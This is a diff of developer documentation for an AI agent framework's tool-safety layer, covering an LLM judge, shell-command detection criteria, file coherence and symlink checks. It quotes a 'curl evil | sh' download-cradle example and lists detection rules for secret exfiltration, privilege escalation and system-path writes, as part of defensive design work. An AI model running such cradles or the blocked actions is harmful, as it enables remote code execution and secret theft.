@@ -3,7 +3,7 @@
 Beyond the [`Tool` interface](tools.md) and the [policy/Judger enforcement](tools.md#toolpolicy) in `ToolRegistry.Execute`, the `tools` package ships a set of **execution-context intelligence** that the runtime layers (executor, planner, reflector) consult while a tool call is being assessed and executed. This document covers the subsystems that have no other home:
 
 - **LLM-backed `ToolJudge`** — a centralized, cached safety assessor that decides whether a mutating call may auto-approve.
-- **Shell command analysis (flowsh)** — the deterministic effect-IR criteria the shell-exec judges consume; the engine is also specified in the [security model](../specs/architecture/security-model.md#shell-command-analysis).
+- **Shell command analysis (flowsh)** — the deterministic effect-IR criteria the shell-exec judges consume; the engine is also specified in the [security model](../specs/architecture/security-model.md#shell-command-analysis-flowsh-criteria).
 - **File coherence** — cross-session conflict detection so two concurrent agents don't silently clobber each other's reads/writes.
 - **Environment info (`EnvInfo`)** — a one-shot snapshot of the host (OS, arch, runtimes) injected into prompts and judge reasoning.
 - **Symlink detection** — defense-in-depth against symlink-escape paths in tool input.
@@ -66,11 +66,11 @@ const (
 ### NewToolJudge
 
 ```go
-func NewToolJudge(provider llm.Provider, model string, maxCacheSize int, logger *slog.Logger) *ToolJudge
+func NewToolJudge(caller llm.Caller, tracker *llm.UsageTracker, maxCacheSize int, logger *slog.Logger) *ToolJudge
 ```
 
-- `provider` — any `llm.Provider` used for the assessment call.
-- `model` — the model ID sent on each judge request.
+- `caller` — the LLM surface every judge call goes through. By construction this is the session's `*llm.Router`, so the judge rides the router's **active** model (its requests carry no `Model`) and the router layers the deterministic sampling profile from the model catalog onto each call. A caller that implements the optional `ActiveModel() string` capability also contributes the model to the advisory cache key and the reasoning-effort spelling.
+- `tracker` — when non-`nil`, wraps `caller` in an `llm.TrackingCaller` so judge token usage lands in the session's accounting. Pass `nil` when the caller already records usage (wrapping an already-tracking caller counts tokens twice) or when judge calls should not be accounted.
 - `maxCacheSize` — caps the LRU-style result cache; `0` defaults to `1000`. When full, the cache is cleared wholesale (judge results are cheap to recompute, so this is a best-effort optimization).
 - `logger` — may be `nil`.
 
@@ -87,9 +87,8 @@ j.SetIsInternalFn(fn func(string) bool)   // fast-path: tool names that always b
 
 ```go
 type JudgeConfig struct {
-    Model        string            // specific model for judge; falls back to DefaultModel
-    DefaultModel string            // fallback model from the active provider
-    Provider     llm.Provider
+    Caller       llm.Caller        // the LLM surface (normally the session's *llm.Router); nil disables the judge
+    UsageTracker *llm.UsageTracker // optional: routes judge calls through a TrackingCaller for token accounting
     MaxCacheSize int               // default 1000 when 0
     SystemPrompt string            // override judge system prompt
     IsInternalFn func(string) bool // tool names that bypass the judge
@@ -98,7 +97,7 @@ type JudgeConfig struct {
 func NewToolJudgeFromConfig(cfg JudgeConfig, logger *slog.Logger) *ToolJudge
 ```
 
-`NewToolJudgeFromConfig` returns `nil` (and logs a warning) when `Provider` is unset or no model can be resolved. Callers should treat a `nil` `*ToolJudge` as "judging disabled" — always nil-check before calling `Judge`.
+`NewToolJudgeFromConfig` returns `nil` when `cfg.Caller` is unset (judge disabled); on success it logs an informational `"tool judge initialized"` line, naming the model when the caller exposes its active one. Callers should treat a `nil` `*ToolJudge` as "judging disabled" — always nil-check before calling `Judge`.
 
 ### How advisory judgment works
 
@@ -111,8 +110,8 @@ The decision flows through several layers, cheapest first:
 1. **Internal-tool fast-path** — if `IsInternalFn(toolName)` returns `true`, the call is allowed without any LLM call. Use this for trusted framework-owned tools.
 2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-path. A shell command can reference only session-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
 3. **Session-roots fast-path** — for non-shell tools, if the input contains at least one absolute path and every such path is within at least one session root (`AllPathsInSessionRoots`), the call is allowed. Session roots are the deduplicated union of the workspace, the temp directory, and any additional roots attached via `WithAllowedRoots` — consult `SessionRoots(ctx)`; all roots are equal peers for this check.
-4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input) + sha256(session roots) + the rendered static-analysis block (when attached)`. The roots participate because the judge's prompt (and therefore the verdict) depends on the session's directory scope, so a verdict is never reused across sessions with different workspaces or auxiliary work directories. A cache hit returns the stored verdict without an LLM call.
-5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block and — when session roots are present — a `## Session Directories` block listing the workspace and additional work directories, with the directory values wrapped in an untrusted-content boundary) and sent with a **2-minute timeout**. For shell tools with an analysis attached to the context, a `## Static Analysis Report` block (the [flowsh digest](#shell-command-analysis-flowsh) behind an untrusted `shell_analysis` boundary) is appended after the session directories; its rendering participates in the cache key, so a verdict computed with the digest is never reused without it. The response is parsed from a `VERDICT:`/`REASON:` text format.
+4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input) + sha256(the caller's active model, when exposed) + sha256(session roots) + sha256(the rendered static-analysis block, when attached)`. The model participates because the same tool+input assessed by a different model is a different safety question. The roots participate because the judge's prompt (and therefore the verdict) depends on the session's directory scope, so a verdict is never reused across sessions with different workspaces or auxiliary work directories. A cache hit returns the stored verdict without an LLM call.
+5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block and — when session roots are present — a `## Session Directories` block listing the workspace and additional work directories, with the directory values wrapped in an untrusted-content boundary) and sent through the `oneshot` helper (a parse-failure nudge loop: two nudges, three attempts). The judge keeps **no private deadline** — the timeout budget is the caller's `ctx`, whatever deadline the host arms on it, and all attempts share that one budget. For shell tools with an analysis attached to the context, a `## Static Analysis Report` block (the [flowsh digest](#shell-command-analysis-flowsh) behind an untrusted `shell_analysis` boundary) is appended after the session directories; its rendering participates in the cache key, so a verdict computed with the digest is never reused without it. The response is parsed from a `VERDICT:`/`REASON:` text format.
 6. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.
 
 ### Response parsing (tolerant)
@@ -135,7 +134,7 @@ The parser accepts the following variations and is **case-insensitive** througho
 
 The verdict value is matched on **whole tokens** (case-insensitive), so `ALLOW` is recognized but a token merely *containing* `allow` (e.g. a path, argument, or the negated compound `DISALLOW`) is not. Only these whole tokens map to `VerdictAllow` (the set that bypasses confirmation): `ALLOW`, `ALLOWED`, `APPROVE`, `APPROVED`, `SAFE`. The deliberate-rejection set (`DENY`, `DENIED`, `BLOCK`, `BLOCKED`, `REJECT`, `DISALLOW`, `DISAPPROVE`) maps to `VerdictDeny` — negated compounds are listed explicitly so they can never be misread as their affirmative base. The confirm set (`CONFIRM`, `CONFIRMED`, `MANUAL`) and any unrecognized token map to `VerdictConfirm`. A response that cannot be parsed at all is a total parse failure — the fail-safe applies and the judge returns `VerdictConfirm`.
 
-> **Tip:** the advisory verdict cache is keyed on `tool+input+session roots+the rendered static-analysis block (when attached)` — not on `taskContext`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task within the same directory scope will be reused. Keep advisory prompts focused on the *intrinsic* safety of the input, not on transient task context.
+> **Tip:** the advisory verdict cache is keyed on `tool+input+the caller's active model+session roots+the rendered static-analysis block (when attached)` — not on `taskContext`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task within the same directory scope will be reused. Keep advisory prompts focused on the *intrinsic* safety of the input, not on transient task context.
 
 ### Strict gate resolution
 
@@ -147,7 +146,9 @@ type StrictJudgeRequest struct {
     Input           json.RawMessage
     TaskContext     string
     ToolSource      string
-    AnalysisContext string // optional: one-line flowsh digest for shell tools ("" omits the envelope field)
+    JudgeReasoning  string        // the host's deterministic reason for escalating the call
+    JudgeSeverity   JudgeSeverity // hard (fired control) or soft (scope question); the zero value is hard
+    AnalysisContext string        // optional: one-line flowsh digest for shell tools ("" omits the envelope field)
 }
 
 func (j *ToolJudge) JudgeStrict(
@@ -155,6 +156,8 @@ func (j *ToolJudge) JudgeStrict(
     request StrictJudgeRequest,
 ) (JudgeVerdict, string, error)
 ```
+
+`JudgeReasoning` and `AnalysisContext` may quote fragments of the untrusted command under evaluation, so both are line-sanitized (`sanitizeEnvelopeLine`) and wrapped in an untrusted-content boundary before entering the prompt envelope (`AnalysisContext` behind the `shell_analysis` source).
 
 It differs deliberately from advisory `Judge`:
 
@@ -222,7 +225,7 @@ Contract guarantees:
 - **exact-token parsing**: the verdict is read from the mandated two-line `VERDICT:`/`REASON:` response, an embedded JSON object, or a bare token; prose that merely *contains* a verdict word is a parse failure and fails closed — only an explicit token may grant work;
 - **untrusted-content envelope**: the task, plan snapshot, breaker reason, and recent-step digest are line-sanitized and wrapped in untrusted-content boundaries before entering the prompt, so instruction-like text in quoted tool data is read as data, not policy;
 - provider errors are not logged because they may echo the request's tool arguments (same policy as `JudgeStrict`);
-- the judge call is bounded by a 2-minute timeout and uses deterministic (`CallPurposeRouting`) sampling.
+- the judge call has no private deadline — its timeout budget is the caller's `ctx` — and uses deterministic (`CallPurposeRouting`) sampling.
 
 An unrecognized or empty `AbortCategory` is normalized to `LoopBoundaryCircuitBreaker`, so a host that forgets to classify a boundary biases the judge toward the stricter breaker semantics.
 
@@ -274,7 +277,7 @@ func ShellJudgeOutcome(ctx context.Context, toolName string) JudgeOutcome
 | --- | --- | --- | --- | --- |
 | C1 | exfiltration pair: secret read → tainted network egress | `command_exfil_flow` | hard | yes |
 | C2 | privilege-escalation effect (e.g. SUID install) | `command_privilege_escalation` | hard | yes |
-| C3 | direct write/metadata on a system path (`/etc`, `/usr`, `/boot`, `/bin`, `/sbin`; Windows `c:\windows`, `c:\program files`, `c:\program files (x86)`, component-boundary matched) or a non-harmless raw device | `command_system_write` | hard | yes |
+| C3 | direct write/metadata on a system path (`/etc`, `/usr`, `/boot`, `/bin`, `/sbin`; Windows `c:\windows`, `c:\program files`, `c:\program files (x86)` **plus** the drive-less `\windows`, `\program files`, `\program files (x86)` forms covering current-drive-relative targets — the drive-less forms are skipped for a bash POSIX-rooted target; all component-boundary matched) or a non-harmless raw device | `command_system_write` | hard | yes |
 | C4 | destructive KB class D/E ∧ irreversible ∧ concrete write target outside the session roots | `command_destructive_outside_roots` | hard | yes |
 | C5 | an established network→code-execution **cradle flow** — fetched content reaching a shell/interpreter (a pipe to `sh`, a sourced or process-substituted fetch, a command-substitution sink); keyed on the proven flow, never on a bare NetEgress/CodeExec co-occurrence | `command_download_cradle` | hard | yes |
 | C6 | analyzer ⊤/conservative **without** a cradle flow, **or** an irreversible write whose target the analyzer could not resolve (⊤ target — e.g. abbreviated PowerShell parameters) | `command_unbounded_analysis` | hard | **no** |
@@ -352,7 +355,7 @@ func WithCoherence(ctx context.Context, checker FileCoherenceChecker) context.Co
 func CoherenceFrom(ctx context.Context) FileCoherenceChecker // nil if none attached
 ```
 
-The executor and built-in file tools consult `CoherenceFrom(ctx)`; if no checker is attached (CLI mode, tests), coherence checks are skipped and the tools behave as if single-session. The built-in file tools format a conflict into a human-readable warning/annotation via `formatReadConflict` / `formatWriteConflict` (internal helpers).
+The built-in file tools consult `CoherenceFrom(ctx)`; if no checker is attached (CLI mode, tests), coherence checks are skipped and the tools behave as if single-session. The built-in file tools format a conflict into a human-readable warning/annotation via `formatReadConflict` / `formatWriteConflict` (internal helpers).
 
 ---
 
@@ -424,9 +427,12 @@ import "github.com/v0lka/sp4rk/tools"
 
 ```go
 type SymlinkTraversal struct {
-    // Path that traverses a symlink, with the workspace-relative/absolute
-    // path components and the resolved target. Used to build a confirmation
-    // prompt or a reasoning string.
+    OriginalPath     string // user-visible path from tool input
+    SymlinkAt        string // component where the symlink was detected
+    ResolvesTo       string // what the symlink points to (readlink result)
+    FullResolved     string // fully resolved absolute path after the symlink chain
+    OutsideWorkspace bool   // does the fully resolved path fall outside the workspace?
+    Unresolvable     bool   // component could not be inspected (Lstat/Readlink failure) — escalate
 }
 ```
 
@@ -447,9 +453,9 @@ Extracts path-like tokens from the tool input (via the [path extraction helpers]
 
 Shell-exec commands (`bash_exec`, `posh_exec`) contribute only their **literal** paths: the bash branch parses with `mvdan.cc/sh` and extracts literal word fragments, the PowerShell branch tokenizes with quote-state tracking and comment skipping (a `$` outside single quotes makes the token dynamic, and dynamic tokens are skipped — they cannot name a literal path). Expansion-driven **suspicion is deliberately not assessed** here: dynamic constructs (`$var`, `$(cmd)`, backticks) are the domain of the deterministic [shell command analysis](#shell-command-analysis-flowsh), which the **host** attaches to the same call (`AnalyzeShellCommandForJudge` + `WithShellAnalysis`). The walk itself neither runs nor requires that analysis, so with nothing attached it surfaces literal paths only and escalates for nothing. The former `suspicious` return value and its `symlink_suspicious` escalation were removed (see [decision 006](../specs/decisions/006-symlink-walk-literal-paths-only.md)).
 
-> **Migration note:** this is a compile-breaking API change. `DetectSymlinksInToolInput` now returns the two `SymlinkTraversal` slices only (no `suspicious` value) and `FormatSymlinkReasoning` no longer takes a `suspicious` argument. The exported extractors `ResolveShellPathTokens`, `UnresolvablePathTokens`, `PathsOutsideRoots`, `ExistingPaths`, and `ExistingOrAnchoredPaths`, and the `ShellKind` type with its `ShellBash`/`ShellPosh` constants — the last remnants of the shell tools' former static judge stages — were removed. Update callers to the literal-path contract and route dynamic-construct coverage through the **host-attached** shell analysis (`AnalyzeShellCommandForJudge` + `WithShellAnalysis`, see [shell command analysis](#shell-command-analysis-flowsh)); the removal is recorded in [decision 006](../specs/decisions/006-symlink-walk-literal-paths-only.md).
+> **Migration note:** this is a compile-breaking API change. `DetectSymlinksInToolInput` now returns the two `SymlinkTraversal` slices only (no `suspicious` value) and `FormatSymlinkReasoning` no longer takes a `suspicious` argument. The exported extractors `ResolveShellPathTokens`, `UnresolvablePathTokens`, `PathsOutsideRoots`, `ExistingPaths`, and `ExistingOrAnchoredPaths`, and the then-`ShellKind` type's `ShellBash`/`ShellPosh` constants — the last remnants of the shell tools' former static judge stages — were removed. (A **new, unrelated** `ShellKind` type was later introduced by the operator shell-invocation model in `tools/shell_invocation.go`, with the constants `ShellKindBash`/`ShellKindSh`/`ShellKindZsh`/`ShellKindKsh`/`ShellKindDash`/`ShellKindPowerShell`/`ShellKindPwsh` and the `ParseShellKind` parser — see [shell command analysis](#shell-command-analysis-flowsh); it is not the removed tokenizer enum.) Update callers to the literal-path contract and route dynamic-construct coverage through the **host-attached** shell analysis (`AnalyzeShellCommandForJudge` + `WithShellAnalysis`, see [shell command analysis](#shell-command-analysis-flowsh)); the removal is recorded in [decision 006](../specs/decisions/006-symlink-walk-literal-paths-only.md).
 
-**Candidate filtering.** The path-extraction helpers apply `looksLikePath`, which rejects strings that are obviously content rather than paths: strings containing control characters (bytes below `0x20` or `0x7f`, which never appear in a real path) and strings longer than `maxPathCandidateLen` (4096, a conservative `PATH_MAX` bound). URLs with a scheme (`http://`, `file://`, …) are also filtered. During the component walk, invalid-path errors (`ENAMETOOLONG`, `ENOTDIR`, `EINVAL` — e.g. a code blob longer than `NAME_MAX` mistakenly joined onto the workspace) stop the walk **without** escalating, since such a candidate cannot be a symlink. Permission errors (`EACCES`) and symlink loops (`ELOOP`) still escalate.
+**Candidate filtering.** The path-extraction helpers apply `looksLikePath`, which rejects strings that are obviously content rather than paths: strings containing control characters (bytes below `0x20` or `0x7f`, which never appear in a real path) and strings longer than `maxPathCandidateLen` (4096, a conservative `PATH_MAX` bound). URLs with a scheme (`http://`, `file://`, …) are also filtered. During the component walk, invalid-path errors (`ENAMETOOLONG`, `ENOTDIR`, `EINVAL` — e.g. a code blob longer than `NAME_MAX` mistakenly joined onto the workspace) stop the walk **without** escalating, since such a candidate cannot be a symlink. Permission errors (`EACCES`) and symlink loops (`ELOOP`) escalate only when the unreadable component lies inside the primary session root (the workspace) — unreadable components outside it are left to the containment/judge checks.
 
 ### OS-level symlink classification
 
@@ -468,7 +474,25 @@ func IsOSLevelSymlink(symlinkPath string, roots ...string) bool
 func FormatSymlinkReasoning(inside, outside []SymlinkTraversal) string
 ```
 
-Turns the partitioned traversals into a single human-readable string for the confirmation prompt (e.g. `"This call traverses a symlink resolving outside the workspace: /ws/link → /etc/secrets"`).
+Turns the partitioned traversals into a single human-readable string for the confirmation prompt. `outside` traversals are rendered first and highlighted as more dangerous; each list is capped at 10 entries with a trailing `... and N more symlink(s)` line. An unresolvable traversal renders `└─ component at: <path> (could not be resolved — target unknown)` instead of a resolved target. For one outside and one inside traversal the output is:
+
+```text
+This tool call traverses symlinks that resolve OUTSIDE the workspace:
+
+  /ws/link/file.txt
+    └─ symlink at: /ws/link → /etc/secrets (outside workspace)
+
+This tool call traverses symlinks (target is within workspace):
+
+  /ws/other/file.txt
+    └─ symlink at: /ws/other → /ws/real (inside workspace)
+
+The agent will follow the symlink and operate on the actual target outside the workspace.
+```
+
+A one-line summary is always appended after the traversal lists (following a blank line): the `The agent will follow the symlink and operate on the actual target outside the workspace.` wording when `outside` is non-empty, otherwise the `The agent will follow the symlink and operate on the resolved target within the workspace.` wording when only `inside` is non-empty. The whole result is passed through `strings.TrimSpace`, so no leading or trailing blank line survives.
+
+Both lists empty ⇒ the empty string.
 
 ---
 
@@ -518,8 +542,9 @@ if judge != nil {
     judge.SetIsInternalFn(isInternalTool) // fast-path framework tools
 }
 
-// The executor and file tools now pick up EnvInfo and Coherence from ctx;
-// the ToolJudge is consulted by the layer that owns mutation gating.
+// The built-in file tools read Coherence from ctx; the judges and the
+// reflector read EnvInfo from ctx. The executor itself consumes neither.
+// The ToolJudge is consulted by the layer that owns mutation gating.
 ```
 
 Every function here is **fail-closed or nil-safe**: a missing checker, a `nil` `EnvInfo`, or a judge LLM error never widens what auto-approves — it either no-ops or escalates to confirmation.
